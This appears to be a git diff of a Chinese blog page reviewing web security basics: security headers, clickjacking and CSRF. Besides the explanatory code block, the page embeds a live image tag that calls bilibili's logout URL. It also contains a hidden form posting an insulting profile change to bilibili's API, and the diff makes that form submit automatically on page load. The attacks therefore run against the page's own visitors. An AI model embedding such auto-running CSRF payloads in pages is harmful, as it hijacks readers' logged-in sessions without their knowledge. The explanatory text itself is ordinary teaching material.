@@ -88,13 +88,13 @@
 <ol>
 <li>请求的类型为 <figure class="highlight plain"><figcaption><span>并且MIME类型不是JavaScript MIME类型</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">### X-Frame-Options</span><br><span class="line">给Header头加上 ``` X-Content-Type-Options ``` 标识，可以指示允许一个页面可否在 &lt;Embed&gt;,&lt;iframe&gt; 或者 &lt;object&gt; 中展现。这可以有效的防止点击劫持 (clickjacking) 的攻击。</span><br><span class="line"></span><br><span class="line">X-Frame-Options 有三个值:[详见](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/X-Frame-Options)</span><br><span class="line">1. ``` DENY ``` 表示该页面不允许在 frame 中展示，即便是在相同域名的页面中嵌套也不允许。</span><br><span class="line">2. ``` SAMEORIGIN ``` 表示该页面可以在相同域名页面的 frame 中展示。</span><br><span class="line">3. ``` ALLOW-FROM uri ``` 表示该页面可以在指定来源的 frame 中展示。</span><br><span class="line"></span><br><span class="line">### X-XSS-Protection</span><br><span class="line">HTTP ``` X-XSS-Protection ```  响应头是Internet Explorer，Chrome和Safari的一个功能，当检测到跨站脚本攻击 (XSS)时，浏览器将停止加载页面。当网站实施一个强大的``` Content-Security-Policy ```来禁用内联的JavaScript (&apos;unsafe-inline&apos;)时, 他们仍然可以为尚不支持 CSP 的旧版浏览器的用户提供保护。</span><br><span class="line"></span><br><span class="line">``` X-XSS-Protection ``` 支持以下值：</span><br><span class="line">1. ``` 0 ``` 禁止XSS过滤。</span><br><span class="line">2. ``` 1 ``` 启用XSS过滤（通常浏览器是默认的）。 如果检测到跨站脚本攻击，浏览器将清除页面（删除不安全的部分）。</span><br><span class="line">3. ``` 1;mode=block ``` 启用XSS过滤。 如果检测到攻击，浏览器将不会清除页面，而是阻止页面加载。</span><br><span class="line">4. ``` 1; report=&lt;reporting-URI&gt;  (Chromium only  ``` 启用XSS过滤。 如果检测到跨站脚本攻击，浏览器将清除页面并使用CSP report-uri指令的功能发送违规报告。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 点击劫持攻击</span><br><span class="line">点击劫持是一种恶意技术，它诱使用户点击与用户感知的内容不同的内容，从而可能泄露机密信息或允许其他人控制其计算机同时点击看似无害的对象。</span><br><span class="line"></span><br><span class="line">举个例子，小王点击了某盗版影视网站的播放按钮，实际上却是偷偷的给淘宝购物车下了单。</span><br><span class="line"></span><br><span class="line">### CSRF/XSRF 跨站请求伪造攻击</span><br><span class="line">CSRF是一种欺骗受害者提交恶意请求的攻击。它继承了受害者的身份和特权，代表受害者履行不受欢迎的职能。对于大多数站点，浏览器请求自动包括与站点关联的任何凭据。</span><br><span class="line"></span><br><span class="line">CSRF攻击的基本原理是：</span><br><span class="line">1. 你登录了某网站，如bilibili.</span><br><span class="line">2. 在你访问恶意网站时，恶意网站针对性的向bilibili发起请求，比如关注我（bilibili已作了csrf防御）。</span><br><span class="line">3. 此时，虽然恶意网站看不到bilibili的cookie，但是cookie会被附加到请求Header头里。就成功欺骗了服务器用你的登录身份关注了我</span><br><span class="line">4. 你看到之篇文章的时候，你的bilibili已经被偷偷的登出了。</span><br></pre></td></tr></table></figure></li>
 </ol>
-<p><img src="https://account.bilibili.com/login?act=exit" alt="bilibili auto loginout"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">5. 或者偷偷修改了一些信息。</span><br><span class="line">``` html</span><br><span class="line">&lt;iframe name=&quot;autopost&quot; display=&quot;none&quot;&gt;</span><br><span class="line">	&lt;form method=&quot;POST&quot; name=&quot;transfer&quot;　action=&quot;https://api.bilibili.com/x/member/web/update&quot;&gt;</span><br><span class="line">		&lt;input type=&quot;hidden&quot; name=&quot;uname&quot; value=&quot;你们全家都是傻子&quot;&gt;</span><br><span class="line">		&lt;input type=&quot;hidden&quot; name=&quot;usersign&quot; value=&quot;偷偷的来&quot;&gt;</span><br><span class="line">		&lt;input type=&quot;hidden&quot; name=&quot;sex&quot; value=&quot;保密&quot;&gt;</span><br><span class="line">		&lt;input type=&quot;hidden&quot; name=&quot;birthday&quot; value=&quot;1900-1-1&quot;&gt;</span><br><span class="line">		&lt;input type=&quot;hidden&quot; name=&quot;csrf&quot; value=&quot;44859482995b0e7dc27fc0cd8bf0196f&quot;&gt;</span><br><span class="line">　&lt;/form&gt;</span><br><span class="line">&lt;/iframe&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">	function autopost() &#123;</span><br><span class="line">		iframe = document.frames[&quot;autopost&quot;].document.Submit(&quot;transfer&quot;);</span><br><span class="line">　&#125;</span><br><span class="line">	autopost()</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://account.bilibili.com/login?act=exit" alt="bilibili auto loginout"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">5. 或者偷偷修改了一些信息。（bilibili作了csrf防御，所以以下行为不会生效。）</span><br><span class="line">``` html</span><br><span class="line">&lt;iframe name=&quot;autopost&quot; display=&quot;none&quot;&gt;</span><br><span class="line">	&lt;form method=&quot;POST&quot; name=&quot;transfer&quot;　action=&quot;https://api.bilibili.com/x/member/web/update&quot;&gt;</span><br><span class="line">		&lt;input type=&quot;hidden&quot; name=&quot;uname&quot; value=&quot;你们全家都是傻子&quot;&gt;</span><br><span class="line">		&lt;input type=&quot;hidden&quot; name=&quot;usersign&quot; value=&quot;偷偷的来&quot;&gt;</span><br><span class="line">		&lt;input type=&quot;hidden&quot; name=&quot;sex&quot; value=&quot;保密&quot;&gt;</span><br><span class="line">		&lt;input type=&quot;hidden&quot; name=&quot;birthday&quot; value=&quot;1900-1-1&quot;&gt;</span><br><span class="line">		&lt;input type=&quot;hidden&quot; name=&quot;csrf&quot; value=&quot;44859482995b0e7dc27fc0cd8bf0196f&quot;&gt;</span><br><span class="line">　&lt;/form&gt;</span><br><span class="line">&lt;/iframe&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">	function autopost() &#123;</span><br><span class="line">		document.frames[&quot;autopost&quot;].document.Submit(&quot;transfer&quot;);</span><br><span class="line">　&#125;</span><br><span class="line">　document.body.onload = autopost</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
 <p><iframe name="autopost" display="none"><br>    <form method="POST" name="transfer" 　action="https://api.bilibili.com/x/member/web/update"><br>        <input type="hidden" name="uname" value="你们全家都是傻子"><br>        <input type="hidden" name="usersign" value="偷偷的来"><br>        <input type="hidden" name="sex" value="保密"><br>        <input type="hidden" name="birthday" value="1900-1-1"><br>        <input type="hidden" name="csrf" value="44859482995b0e7dc27fc0cd8bf0196f"><br>　</form><br></iframe></p>
 <script type="text/javascript">
     function autopost() {
-        iframe = document.frames["autopost"].document.Submit("transfer");
+        document.frames["autopost"].document.Submit("transfer");
 　}
-    autopost()
+    document.body.onload = autopost
 </script>
 
 <h5 id="如何防御CSRF"><a href="#如何防御CSRF" class="headerlink" title="如何防御CSRF"></a>如何防御CSRF</h5><ol>
@@ -105,7 +105,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://hijimo.github.io/2019/01/25/复习--web安全基础/" data-id="cjrcubbl00035f83gl5tg4f3g" class="article-share-link">Teilen</a>
+      <a data-url="http://hijimo.github.io/2019/01/25/复习--web安全基础/" data-id="cjrcuhmzn003dg23g6pda7bol" class="article-share-link">Teilen</a>
       
       
     </footer>
@@ -184,7 +184,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://hijimo.github.io/2018/10/21/webRTC基础篇--视频编解码基础/" data-id="cjrcubbk10018f83g56vcr6gw" class="article-share-link">Teilen</a>
+      <a data-url="http://hijimo.github.io/2018/10/21/webRTC基础篇--视频编解码基础/" data-id="cjrcuhmya0017g23g0nh3cpsc" class="article-share-link">Teilen</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/webRTC/">webRTC</a></li></ul>
@@ -258,7 +258,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://hijimo.github.io/2018/10/03/webRTC基础篇-ice/" data-id="cjrcubbk5001if83grrcidx8p" class="article-share-link">Teilen</a>
+      <a data-url="http://hijimo.github.io/2018/10/03/webRTC基础篇-ice/" data-id="cjrcuhmye001eg23gwj5hi3ee" class="article-share-link">Teilen</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/webRTC/">webRTC</a></li></ul>
@@ -338,7 +338,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://hijimo.github.io/2018/09/19/webRTC基础篇--NAT/" data-id="cjrcubbk2001bf83g9s9re1ik" class="article-share-link">Teilen</a>
+      <a data-url="http://hijimo.github.io/2018/09/19/webRTC基础篇--NAT/" data-id="cjrcuhmyc001bg23gnill8vsg" class="article-share-link">Teilen</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/webRTC/">webRTC</a></li></ul>
@@ -393,7 +393,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://hijimo.github.io/2018/09/01/webRTC基础--音视频/" data-id="cjrcubbjy0011f83gqs25geh0" class="article-share-link">Teilen</a>
+      <a data-url="http://hijimo.github.io/2018/09/01/webRTC基础--音视频/" data-id="cjrcuhmy90014g23g57vca6bi" class="article-share-link">Teilen</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/webRTC/">webRTC</a></li></ul>
@@ -440,7 +440,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://hijimo.github.io/2018/05/01/【转】阮一峰：数字签名是什么？/" data-id="cjrcubbk6001lf83gbc6fe7xv" class="article-share-link">Teilen</a>
+      <a data-url="http://hijimo.github.io/2018/05/01/【转】阮一峰：数字签名是什么？/" data-id="cjrcuhmyi001hg23ga90t7ctz" class="article-share-link">Teilen</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/前端/">前端</a></li></ul>
@@ -500,7 +500,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://hijimo.github.io/2018/03/31/前端优化-渲染优化四-管道-合成/" data-id="cjrcubbkp002of83gee6pya56" class="article-share-link">Teilen</a>
+      <a data-url="http://hijimo.github.io/2018/03/31/前端优化-渲染优化四-管道-合成/" data-id="cjrcuhmz5002lg23gxts9455p" class="article-share-link">Teilen</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/composite/">composite</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/前端优化/">前端优化</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/渲染/">渲染</a></li></ul>
@@ -548,7 +548,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://hijimo.github.io/2018/03/31/前端优化-渲染优化三-管道-css/" data-id="cjrcubbkk002df83ge4pwtiu4" class="article-share-link">Teilen</a>
+      <a data-url="http://hijimo.github.io/2018/03/31/前端优化-渲染优化三-管道-css/" data-id="cjrcuhmz3002ig23gk5enazx6" class="article-share-link">Teilen</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/css/">css</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/前端优化/">前端优化</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/渲染/">渲染</a></li></ul>
@@ -596,7 +596,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://hijimo.github.io/2018/03/31/前端优化-渲染优化二-管道-javascript/" data-id="cjrcubbks002rf83gnpphnugy" class="article-share-link">Teilen</a>
+      <a data-url="http://hijimo.github.io/2018/03/31/前端优化-渲染优化二-管道-javascript/" data-id="cjrcuhmz7002pg23g7h99ebin" class="article-share-link">Teilen</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/javascript/">javascript</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/前端优化/">前端优化</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/渲染/">渲染</a></li></ul>
@@ -651,7 +651,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://hijimo.github.io/2018/03/22/前端优化-移动设备的性能分析/" data-id="cjrcubbkn002kf83gbmhhbo2t" class="article-share-link">Teilen</a>
+      <a data-url="http://hijimo.github.io/2018/03/22/前端优化-移动设备的性能分析/" data-id="cjrcuhmzb002wg23gmqwcvxcd" class="article-share-link">Teilen</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/分析/">分析</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/前端优化/">前端优化</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/性能/">性能</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/移动/">移动</a></li></ul>
